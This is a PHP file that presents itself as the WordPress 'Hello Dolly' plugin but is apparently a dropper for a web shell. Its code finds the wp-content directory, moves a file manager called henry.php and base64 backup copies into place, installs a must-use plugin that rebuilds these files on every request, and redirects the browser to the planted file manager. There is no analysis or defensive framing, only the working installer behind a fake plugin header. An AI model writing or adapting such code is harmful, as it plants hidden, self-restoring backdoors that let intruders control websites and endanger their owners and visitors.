<?php
/**
 * @package Hed
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

// 1. Robustly find the wp-content directory (Server Path)
$current_dir = __DIR__;
$wp_content_dir = '';

if (basename($current_dir) === 'wp-content') {
    $wp_content_dir = $current_dir;
} elseif (is_dir($current_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
    $wp_content_dir = $current_dir . DIRECTORY_SEPARATOR . 'wp-content';
} else {
    $search_dir = $current_dir;
    while ($search_dir && $search_dir !== '.' && $search_dir !== DIRECTORY_SEPARATOR) {
        if (basename($search_dir) === 'wp-content') {
            $wp_content_dir = $search_dir;
            break;
        }
        if (is_dir($search_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $search_dir = $current_dir;
    for ($i = 0; $i < 5; $i++) {
        if (file_exists($search_dir . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $wp_content_dir = dirname($current_dir);
}

// 2. Define the files and their target destinations
//
// Layout after this script runs:
//   wp-content/henry.php            <-- the actual file manager
//   wp-content/read.html            <-- base64 backup of henry.php (used by the healer)
//   wp-content/mu-plugins/henry-healer.php <-- mu-plugin that re-hydrates henry.php/read.html/data.log on every request
//   wp-content/mu-plugins/read2.html       <-- secondary base64 backup (kept next to its regenerator)
//
// All four files must live next to mover.php when this script runs.
$mu_plugins_dir = $wp_content_dir . DIRECTORY_SEPARATOR . 'mu-plugins';

$files_to_move = [
    'henry.php'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'henry.php',
    'read.html'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'read.html',
    'henry-healer.php' => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'henry-healer.php',
    'read2.html'       => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'read2.html',
];

// Start Output
echo "<div style='font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; border-radius: 5px; max-width: 800px; margin: 20px auto;'>";
echo "<h3>Executing File Move Operations...</h3>";

// 3. Process each file
$all_success = true;
foreach ($files_to_move as $filename => $target_path) {
    $source_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
    
    if (!file_exists($source_path)) {
        echo "<span style='color: #ffaa00;'>[SKIPPED]</span> Source file not found: <strong>{$filename}</strong><br>";
        continue;
    }

    $target_dir = dirname($target_path);
    if (!is_dir($target_dir)) {
        if (mkdir($target_dir, 0755, true)) {
            echo "<span style='color: #00aaff;'>[CREATED]</span> Directory: <strong>{$target_dir}</strong><br>";
        } else {
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to create directory: <strong>{$target_dir}</strong><br>";
            $all_success = false;
            continue;
        }
    }

    if (rename($source_path, $target_path)) {
        echo "<span style='color: #00ff00;'>[SUCCESS]</span> Moved <strong>{$filename}</strong><br>";
    } else {
        echo "<span style='color: #ff4444;'>[FAILED]</span> Could not move <strong>{$filename}</strong><br>";
        $all_success = false;
    }
}

// 4. Calculate the URL for the redirect
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$request_uri = $_SERVER['REQUEST_URI'];

if (strpos($request_uri, '/wp-content/') !== false) {
    $uri_parts = explode('/wp-content/', $request_uri);
    $redirect_url = $protocol . $host . $uri_parts[0] . '/wp-content/henry.php';
} else {
    $clean_uri = preg_replace('/\/[^\/]+\.php(\?.*)?$/i', '', $request_uri);
    $redirect_url = $protocol . $host . rtrim($clean_uri, '/') . '/wp-content/henry.php';
}

echo "<hr style='border: 1px solid #333;'>";

if ($all_success) {
    echo "<strong>Operation Complete. Redirecting in 2 seconds...</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Click here if you are not redirected automatically &rarr;</a>";
    
    // JavaScript Redirect
    echo "<script>
        setTimeout(function() {
            window.location.href = '{$redirect_url}';
        }, 2000);
    </script>";
} else {
    echo "<strong style='color: #ffaa00;'>Operation finished with warnings/errors. Auto-redirect cancelled so you can read the logs.</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Go to henry.php manually &rarr;</a>";
}

echo "</div>";
?>